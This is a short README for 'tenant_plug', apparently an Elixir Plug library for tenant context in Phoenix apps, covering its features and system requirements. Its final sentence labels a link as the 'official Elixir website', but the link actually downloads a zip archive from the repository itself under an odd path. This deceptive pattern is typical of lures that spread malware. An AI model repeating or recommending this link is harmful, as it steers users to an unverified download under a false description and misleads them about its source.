## 🌟 Overview

tenant_plug is an Elixir Plug library designed for automatic tenant context management. It streamlines the way tenant information is handled in Phoenix and Plug-based applications. By extracting tenant data from HTTP requests through customizable sources, tenant_plug stores it in a local context. This makes it easily accessible during the entire request lifecycle.

## ⚙️ Features

- **Automatic Tenant Handling**: Automatically identifies tenants based on request data.
- **Flexible Configuration**: Supports various data sources for tenant extraction.
- **Lightweight and Fast**: Designed for efficiency in microservices and multitenant applications.
- **Easy Integration**: Works seamlessly with existing Plug and Phoenix applications.
- **Telemetry Support**: Incorporates telemetry for monitoring and debugging.
- **Subdomain Capabilities**: Supports tenant identification via subdomains.

## 📦 System Requirements

- **Elixir Version**: 1.10 or greater.
- **Phoenix Version**: 1.5 or greater.
- **Operating System**: Compatible with Linux, macOS, and Windows.
  
Ensure that you have Elixir and Phoenix properly installed on your system. If you need help with installation, please refer to the official [Elixir website](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip).
